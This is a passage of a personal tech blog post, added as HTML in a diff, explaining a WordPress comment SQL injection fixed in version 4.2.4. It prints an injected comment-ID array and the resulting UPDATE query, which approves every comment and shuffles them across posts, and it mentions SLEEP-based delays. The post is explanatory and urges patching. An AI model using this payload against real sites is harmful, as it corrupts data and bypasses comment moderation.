+inject an <a href="https://dev.mysql.com/doc/refman/5.0/en/update.html">IGNORE</a> keyword into the query without modifying the source code 
+itself. So it seems an infinite loop attack is out of our range given the indices 
+on the table, but the <code>SLEEP</code> value can easily be made into the thousands range
+so it&#39;s not actually neccesary for an attack to work.</p>
+<p>The other way one could abuse this injection would be to modify the posts the 
+comments belong to:</p>
+<pre><code>$comments = array(&quot;&#39;) OR (comment_post_ID &gt;= 0 OR &#39;1&#39;=&#39;1&quot; =&gt; &quot;1&#39;, comment_post_ID = comment_post_ID + &#39;1&quot;)
+UPDATE wp_comments 
+    SET comment_approved = &#39;1&#39;, comment_post_ID = comment_post_ID + &#39;1&#39; 
+WHERE comment_ID IN (&#39;&#39;) OR (comment_post_ID &gt;= 0 OR &#39;1&#39;=&#39;1&#39;);
+</code></pre><p>Which would cause comments for one post to shift to the next for every single 
+post. Causing a massive headache for whoever has to sort them back into order. 
+By changing the <code>+ &#39;1&#39;</code> to something like <code>FLOOR(RAND() * 401) + 10000</code> to shift
+the comments around in a random order, an even larger headache could happen. </p>
+<p>Despite this alarming use of the injection attack, it&#39;s important to note how 
+obscure and unlikely the scenario to cause this has to be. Using a MyISAM table 
+for your comments table is, hopefully, an unlikely situation for you to be dealing 
+with in the first place. And if an attacker has access to your database to change 
+it and do the injection attack in the first place, you have bigger problems. And a 
+perfect storm of security flaws is unlikely to be the one occupying your time!</p>
+<h4>Closing thoughts</h4><ol>
+<li>Subscribe to security mailing lists (it&#39;s informative, and fun!)</li>
+<li>Keep your software up to date! (the above issue is fixed in 4.2.4 and up)</li>
+<li>Take the time to try to exploit your own site with exploits from the mailing lists, it&#39;s fun to do on a weekend and will enhance your understanding of your sites vulnerabilities and how to protect it.</li>
+</ol>
+      
+      <h3>Other Posts</h3>
+      <div id="other-posts">
+        <ul>
+          <li><a href=jenkins-multiple-deploy-keys-and-github>Multiple Deploy Keys and Jenkins</a></li><li><a href=protecting-proxied-servers>Administrative Gotcha when doing local proxying</a></li><li><a href=spray-transparent-head-requests-testing>Spray&#39;s Transparent Head Requests and Testing</a></li><li><a href=logging-to-a-file-spray-async>Logging to a File in Spray</a></li><li><a href=serializing-json-generic-classes-spray-json>Serializing Generic Types with Spray JSON Library</a></li><li><a href=serializing-java-util-locale-with-spray-json>Serializing java.util.Locale with Spray JSON library</a></li>
+        </ul>
+      </div>
+      <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'ejehardenberg';
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink"><!--
+    -->comments powered by <span class="logo-disqus">Disqus</span>
+</a>   
+    </div>
+    <nav>
+	<ul>
+		
+			<li>
+				<a href="/index">
+					<img src="//static1.ethanjoachimeldridge.info/california.jpg" width="32px" height="32px" /><!--
+					--><span>Home</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/about">
+					<img src="//static2.ethanjoachimeldridge.info/ethan.jpeg" width="32px" height="32px" /><!--
+					--><span>About me</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/projects">
+					<img src="//static3.ethanjoachimeldridge.info/project.png" width="32px" height="32px" /><!--
+					--><span>Projects</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/resume">
+					<img src="//static4.ethanjoachimeldridge.info/cv.png" width="32px" height="32px" /><!--
+					--><span>Resume</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/tech-blog">
+					<img src="//static5.ethanjoachimeldridge.info/tech-blog.png" width="32px" height="32px" /><!--
+					--><span>Tech Blog</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/cooking">
+					<img src="//static6.ethanjoachimeldridge.info/cooking.jpg" width="32px" height="32px" /><!--
+					--><span>Cooking</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/writing">
+					<img src="//static7.ethanjoachimeldridge.info/writing.png" width="32px" height="32px" /><!--
+					--><span>Writing</span>
+				</a>
+			</li>
+		
+			<li>
+				<a href="/contact">
+					<img src="//static.ethanjoachimeldridge.info/contact.png" width="32px" height="32px" /><!--
+					--><span>Contact</span>
+				</a>
+			</li>
+		
+		<li>
+			<a href="/writing/political">
+				<img src="//static1.ethanjoachimeldridge.info/politics.png" width="32px" height="32px" /><!--
+				--><span>Opinion</span>
+			</a>
+		</li>
+		<li>
+			<a href="https://github.com/EdgeCaseBerg">
+				<img src="//static2.ethanjoachimeldridge.info/github.png" width="32px" height="32px" /><!--
+				--><span>Github</span>
+			</a>
+		</li>
+		<li> 
+			<a href="https://twitter.com/TheR3dLily">
+				<img src="//static3.ethanjoachimeldridge.info/twitter-bird-light-bgs.png" width="32px" height="32px" /><!--
+				--><span>@TheR3dLily</span>
+			</a>
+		</li>
+		<li>
+			<a href="http://www.linkedin.com/profile/view?id=151414806">
+				<img src="//static4.ethanjoachimeldridge.info/LinkedIn_logo.png" width="32px" height="32px"/><!--
+				--><span>LinkedIn</span>
+			</a>
+		</li>
+	</ul>
+</nav>
+
+  </body>
+</html>
+  	
